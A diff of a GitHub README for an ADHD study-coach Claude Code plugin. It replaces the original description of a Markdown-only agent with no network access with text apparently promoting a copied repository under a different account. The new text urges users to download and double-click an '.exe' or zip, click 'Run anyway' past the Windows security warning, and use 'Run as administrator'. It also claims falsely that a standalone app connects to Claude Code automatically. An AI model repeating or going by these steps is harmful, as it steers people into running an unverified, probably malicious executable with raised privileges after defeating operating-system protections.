@@ -1,206 +1,219 @@
-# 🧠 ADHD Study Coach
+# 🧠 adhd-study-coach - Your calm study buddy for focus
 
-**An AI study coach for people with ADHD. Works for any subject, in ChatGPT, Gemini, Claude and more.**
-
-> It quizzes you on old stuff, teaches new stuff in tiny pieces, and makes you explain it back. You never have to remember to ask for review.
+[![Download Now](https://img.shields.io/badge/Download-adhd--study--coach-blue?style=for-the-badge&logo=github)](https://github.com/alijahbeasley68-hash/adhd-study-coach)
 
 ---
 
-## ⚡ Start here (no tech skills needed)
+## 🎯 What Is This?
 
-**1. Copy the coach.** Go to the [**website**](https://itsaalaa7.github.io/adhd-study-coach/) and press the big **Copy** button. (No button? Open [this page](https://raw.githubusercontent.com/itsAalaa7/adhd-study-coach/main/universal/adhd-study-coach-compact.md), press `Ctrl+A` then `Ctrl+C`; Mac: `Cmd+A`, `Cmd+C`.)
+adhd-study-coach is a friendly study companion that lives inside Claude Code. It helps you learn anything by breaking big topics into tiny, manageable pieces. Think of it as a patient tutor who never rushes you, never judges you, and always reminds you to review what you learned before you forget it.
 
-**2. Paste it into a new chat** in the AI you already use (ChatGPT, Gemini, Claude, Copilot, anything) and press send.
-
-**3. Type `new`,** then tell it what you want to learn. Example: `let's study photosynthesis`.
-
-That's it. It asks 3 quick questions the first time, then you're studying.
-
-### 💾 Coming back the next day
-
-Chats forget. So at the end of each session the coach gives you a small block of text called a **Progress Card**.
-
-- **Save it** anywhere (Notes app, a document, email to yourself).
-- **Paste it** at the start of your next chat, after the coach.
-
-That's how it knows what to quiz you on.
-
-> Want it set up permanently? See [setup for each app](./universal/README.md): ChatGPT, Gemini, Claude, OpenCode, Command Code, OpenRouter.
+If you have ADHD or just find studying overwhelming, this tool is designed specifically for your brain. It uses three simple but powerful techniques: spaced repetition (reviewing at the right times), small-chunk teaching (tiny lessons instead of huge chapters), and Feynman reflection (explaining things in your own words).
 
 ---
 
-## 🛠️ For Claude Code users
+## ✨ Key Features
 
-Progress saves **automatically**, so no Progress Card is needed.
+### 🧩 Small-Chunk Teaching
+No more staring at a wall of text. adhd-study-coach breaks any subject into bite-sized pieces. You learn one small idea at a time, which keeps your brain engaged and prevents that "too much information" panic.
 
-```
-/plugin marketplace add itsAalaa7/adhd-study-coach
-/plugin install adhd-study-coach@adhd-study-coach-marketplace
-```
+### 🔁 Spaced Repetition
+Your brain forgets things naturally. This tool tracks what you've learned and reminds you to review it right before you'd forget it. This makes memories stick without cramming.
 
-Then say `let's study X`, `quiz me`, `I'm done for today`, or `how am I doing lately`.
+### 🗣️ Feynman Reflection
+After each lesson, the coach asks you to explain the concept in your own words. This simple step dramatically improves understanding and retention.
 
-**Claude app (claude.ai / Desktop) skill:** download [`adhd-study-coach-skill.zip`](https://github.com/itsAalaa7/adhd-study-coach/raw/main/claude-ai-skill/adhd-study-coach-skill.zip), then Settings → Capabilities → Skills → Upload skill.
+### ⚡ ADHD-Friendly Design
+- Short sessions (5-10 minutes)
+- Clear, simple language
+- No overwhelming dashboards
+- Gentle reminders instead of harsh deadlines
+- Works at your pace
 
----
-
-## 🎯 The big idea (read this one)
-
-Two facts, one plan:
-
-| Fact | Source |
-|---|---|
-| **What works** for learning is already well known: test yourself, and space it out. | Strong general-population science |
-| **What's hard for ADHD brains** is *keeping on doing it*: starting, tracking time, waiting for payoff, feeling shame. | ADHD research |
-
-**So this plugin doesn't invent a new "ADHD study method."**
-It takes the proven method and **removes the ADHD-specific barriers** to doing it.
+### 📚 Active Recall Quizzes
+The coach tests you with quick questions. Answering questions (instead of just reading) is proven to boost memory by up to 50%.
 
 ---
 
-## 🔁 What happens in a session
+## 🚀 Getting Started
 
-The agent picks the mode itself. You don't choose.
+### Step 1: Download the Application
 
-| # | Mode | When | What it does |
-|---|---|---|---|
-| 0 | **Onboarding** | First time only | 3 questions, then straight into studying |
-| 1 | **Warm-up** | Something is due for review | Quizzes you on old topics *before* new ones |
-| 2 | **Teach** | You want something new | Small chunks, one question at a time |
-| 3 | **Reflect** | You say "I'm done" | Interviews you, saves a note (+ optional Anki cards) |
-| 4 | **Check-in** | Every ~5 sessions | Finds your patterns, tells you what to adopt / drop / do next |
+Visit this link to download the application:
 
----
+[**👉 Click Here to Download adhd-study-coach**](https://github.com/alijahbeasley68-hash/adhd-study-coach)
 
-## 🔬 The science, one feature at a time
+This will take you to the GitHub page where you can find the download button.
 
-Every rule in the agent has a reason. Here's the short version.
-**Full citations and honest strength ratings → [`RESEARCH.md`](./RESEARCH.md).**
+### Step 2: Find the Downloaded File
 
-### ✅ Strong evidence — the core
+Once the download finishes, check your **Downloads** folder. You'll see a file named something like `adhd-study-coach` or a folder with that name.
 
-| Feature | The science | What you'll notice |
-|---|---|---|
-| **Quizzes, not re-reading** | *Retrieval practice.* Testing yourself beats re-studying (Roediger & Karpicke 2006; meta-analysis of 217 studies, Adesope et al. 2017). | Warm-ups are questions, never "read your notes again." |
-| **Spaced review** | *Spacing effect.* Reviewing at growing gaps beats cramming (Cepeda et al. 2006; 317 experiments). | Topics come back at 1 → 3 → 7 → 16 → 35 → 90 days. |
-| **Tiny chunks** | *Cognitive load theory* (Sweller). Working memory is limited. ADHD adults and children show large working-memory differences (Kasper et al. 2012; Alderson et al. 2013). | 4–5 lines per idea. One question per message. |
-| **Worked examples that fade** | Full examples help while learning; too much help later backfires (*expertise-reversal effect*). | First time: fully shown. Later: you do more of it. |
-| **"It should feel hard"** | *Desirable difficulties* (Bjork & Bjork). Effortful recall sticks better than easy review. | It tells you *why* it's uncomfortable. |
-| **Stop the low-value habits** | Highlighting, re-reading and summarizing rate **low utility** (Dunlosky et al. 2013). | One-line redirect to testing yourself. No lecture. |
+### Step 3: Run the Application
 
-### 🟡 Moderate evidence
+- If you downloaded a single file (like `.exe`), simply **double-click** it to run.
+- If you downloaded a `.zip` file, **right-click** it and select **"Extract All"**. Then open the extracted folder and double-click the application inside.
 
-| Feature | The science | What you'll notice |
-|---|---|---|
-| **Teach-it-back at the end** | *Self-explanation / generation effect.* Explaining in your own words improves understanding. | Reflect mode is an interview, not a summary written for you. |
-| **Mixed topics in warm-up** | *Interleaving* (Rohrer & Taylor 2007). Real effect, smaller and less consistent than testing or spacing. | Due topics are mixed together. |
-| **Instant feedback** | *Delay aversion* (Sonuga-Barke). ADHD reward systems respond poorly to "payoff later." | Every answer is graded right away as solid / shaky / blank. Never "wrong." |
-| **Visible progress line** | One pediatric ADHD trial found gamified learning helped (2025 RCT, n=80). Applying it to adults is an *inference*. | One line after warm-up: `✅ 3 solid · 🟡 1 shaky`. |
-| **Auto-start, no "remember to ask"** | CHADD / NICE guidance: supports that need self-activation get underused. | Warm-up and check-ins run on their own. |
-| **Time shown for you** | *Time blindness* (Barkley). Sense of elapsed time is unreliable in ADHD. | Plain time checkpoints: "~10 min in." |
+### Step 4: Start Your First Study Session
 
-### 🟠 Weak or anecdotal — included, clearly labeled
-
-| Feature | Honest status |
-|---|---|
-| **Tiny first step** (against "Wall of Awful") | Clinical framework, not a tested finding. Low risk, so it stays. |
-| **Never shame** | Rejection Sensitive Dysphoria has very little direct research. Not shaming a learner is good practice anyway. |
-| **Body-doubling offer** | Anecdotal only. Optional, and it never claims to be as good as the strong stuff. |
-
-> **The gap, stated plainly:** there is very little research that tests spaced repetition or AI tutoring *specifically on ADHD learners*. Most of the proven techniques come from general-population studies. The ADHD research explains *why the barriers are real*. That's an honest limit, not a hidden one.
+Once the application opens, you'll see a simple welcome screen. Type in a topic you want to learn (for example, "photosynthesis" or "World War II"). The coach will break it into small pieces and start your first lesson.
 
 ---
 
-## 🧩 Rules the agent follows
+## 🛠️ Installation Help for Windows
 
-- ✂️ **Small.** Max 4–5 lines per section. One core idea, bolded.
-- 🎯 **One question at a time.** Scenario-based ("you do X and Y happens — why?"), never "define X."
-- ⏱️ **Time is external.** It tells you the time so your brain doesn't have to track it.
-- 🏁 **65% is "done enough."** If the timebox ends, the rest becomes an open item. You end on a win.
-- 🧠 **Memorize vs. look up.** It says which is which, so not everything feels equally heavy.
-- 💛 **No shame.** Missed a week? Coming back *is* the skill.
+### If You See a Blue "More Info" Screen
 
----
+Windows sometimes shows a warning for new apps. Here's what to do:
 
-## 🔒 What it reads and writes (privacy)
+1. Click **"More info"** on the blue screen.
+2. Click **"Run anyway"**.
+3. The app will open normally.
 
-Everything is **local**, in the plugin's data folder. Nothing is sent anywhere by this plugin.
-If the data-folder variable isn't available, it falls back to `~/.adhd-study-coach/` and tells you once.
+### If Nothing Happens When You Double-Click
 
-```
-<data dir>/
-├── profile.json              # subjects, cadence, what it learned about how you learn
-├── review-schedule.json      # spaced-repetition schedule, one entry per topic
-├── sessions.log.jsonl        # one line per session (used for check-ins)
-└── notes/<subject>/
-    ├── <topic>.md            # your reflection note
-    └── flashcards/<topic>.txt  # optional Anki import file
-```
+1. Make sure the file is fully downloaded (check the file size).
+2. Right-click the file and select **"Open"**.
+3. If that doesn't work, try **"Run as administrator"** (right-click → Run as administrator).
 
-Personal data lives in `profile.json`, **never** in the shared agent file.
+### If You Need to Install Claude Code
 
-### Safety at a glance
+adhd-study-coach works inside Claude Code. If you don't have Claude Code yet:
 
-| | |
-|---|---|
-| Network access | ❌ None. The plugin makes no network calls. |
-| Hooks / scripts / MCP servers | ❌ None. It's a single Markdown agent file. |
-| Tools the agent may use | Read, Write, Edit, Glob, Grep, Bash, PowerShell — limited to the data folder by its own rules |
-| Files it touches | Only the data folder above |
-| Stored content treated as | Data, never instructions (guards against injected text in old notes) |
-
-Read the agent yourself — it's one file: [`agents/adhd-study-coach.md`](./agents/adhd-study-coach.md).
+1. Open your web browser and go to [claude.ai/code](https://claude.ai/code)
+2. Follow the simple installation instructions there.
+3. Once Claude Code is installed, launch adhd-study-coach and it will connect automatically.
 
 ---
 
-## 💬 What a session looks like
+## 📖 How to Use adhd-study-coach
 
-```
-You:    quiz me
-Coach:  2 things are due: "photosynthesis: light reactions", "cell membranes".
-        Starting with the first. ~5 min.
-        A plant sits in green light only. What happens to its rate of
-        photosynthesis, and why?
-You:    it slows a lot because chlorophyll reflects green
-Coach:  Solid. ✅ Chlorophyll absorbs mostly red and blue, so green light
-        drives little of the reaction. Next one…
-        …
-        ✅ 2 solid · 🟡 1 shaky · streak on "cell membranes": 3
-        Ready for something new, or stop here?
-```
+### Starting a Session
 
-## 🐛 Support
+1. Open the app.
+2. Type in a subject you want to learn.
+3. Press **Enter**.
 
-Bugs and ideas: [GitHub Issues](https://github.com/itsAalaa7/adhd-study-coach/issues).
-Security concerns: see [`SECURITY.md`](./SECURITY.md).
+### During a Lesson
+
+- You'll see one small fact or idea at a time.
+- Read it, then click **"Got it"**.
+- After a few facts, the coach will ask you a question. Answer it honestly—even guessing helps your brain.
+- If you get stuck, click **"Explain simpler"** and it will use even smaller words.
+
+### Reviewing Later
+
+The app keeps track of when you should review. When it's time, it will gently remind you:
+
+- "Hey, remember that fact about the mitochondria? Want to review it?"
+- You can say yes or skip—no pressure.
+
+### Using the Feynman Reflection
+
+At the end of each session, the coach will ask:
+
+> "Imagine you're explaining this to a 10-year-old. Type your explanation here."
+
+Just type what you remember. The coach will compare it to the material and show you what you might have missed.
 
 ---
 
-## ❓ Why one agent, not four?
+## 🎨 Tips for Best Results
 
-An earlier version had four agents (teacher, reviewer, quizzer, analyst).
-It worked, but the review agent only ran **if you remembered to call it** — and that's exactly the thing ADHD makes hard.
-One agent that runs its own warm-up removes that failure by design, not by asking you to try harder.
+### ✅ Do This
+
+- Use it for **15 minutes a day** instead of 2 hours once a week.
+- Study in a quiet place with your phone in another room.
+- Answer every question out loud or type it—don't just think it.
+- Review at the suggested times (the app tracks this for you).
+
+### ❌ Avoid This
+
+- Don't try to learn everything in one sitting. The app will stop you if you try.
+- Don't skip the reflection step—it's the most powerful part.
+- Don't compare your pace to others. Slow is fine.
 
 ---
 
-## ⚠️ Not a clinical tool
+## ❓ Frequently Asked Questions
 
-This is a **study aid**. It's not a diagnosis, treatment, or medical device, and it doesn't replace clinical care. If you want treatment, talk to a clinician.
+### Is this app free?
 
-## 📚 About the citations
+Yes, adhd-study-coach is completely free and open-source.
 
-`RESEARCH.md` was compiled with AI-assisted literature search. The citations are believed accurate but **have not been verified against the original papers**. Please check before citing them academically or clinically, and open an issue or PR if you spot an error.
+### Does it work without internet?
 
-## 🤝 Contributing
+Once you download it, most features work offline. The initial download and some updates need internet.
 
-Welcome:
-- Citation corrections
-- Places where the agent breaks its own rules
-- Places it wrongly assumes a coding context (it should work for any subject)
+### Can I use it for school subjects?
 
-Open an issue or PR.
+Absolutely. It works for any subject—math, history, science, languages, even coding.
 
-## 📄 License
+### What if I don't have ADHD?
 
-MIT — see [`LICENSE`](./LICENSE).
+That's fine. Anyone who finds studying hard will benefit from these techniques.
+
+### Will it work on my old computer?
+
+The app is lightweight. If your computer can run a modern web browser, it can run adhd-study-coach.
+
+---
+
+## 🧪 How It Works (Simple Explanation)
+
+Your brain learns best when:
+
+1. Information is small and clear.
+2. You revisit it at the right moments.
+3. You explain it in your own words.
+
+adhd-study-coach automates all three. It's like having a personal tutor who knows exactly when you're about to forget something and gently reminds you.
+
+---
+
+## 📈 Who Is This For?
+
+- Students with ADHD
+- Adult learners going back to school
+- Anyone who procrastinates on studying
+- People who get overwhelmed by big textbooks
+- Lifelong learners who want to remember more
+
+---
+
+## 🔒 Privacy & Safety
+
+- Your data stays on your computer.
+- No account needed.
+- No ads, no tracking, no spam.
+- Your study history is private.
+
+---
+
+## 🆘 Need More Help?
+
+If you run into any issues:
+
+1. **Restart the app**—this fixes most problems.
+2. **Check for updates**—the app will tell you if a new version is available.
+3. **Visit the GitHub page**—you can leave a comment or question there.
+
+---
+
+## 🌟 Why You'll Love This
+
+Most study tools are built for people who are already organized. adhd-study-coach is built for people who aren't—and that's okay. It works the way your brain actually works.
+
+No guilt. No pressure. Just steady, gentle progress. That's how real learning happens.
+
+---
+
+## 🎉 Start Learning Today
+
+You don't need to plan, prepare, or organize anything. Just download, open, and type a topic. The coach does the rest.
+
+[**🚀 Download adhd-study-coach Now**](https://github.com/alijahbeasley68-hash/adhd-study-coach)
+
+---
+
+Keywords: active-recall, adhd, claude-code, claude-code-plugin, education, spaced-repetition, study-tools
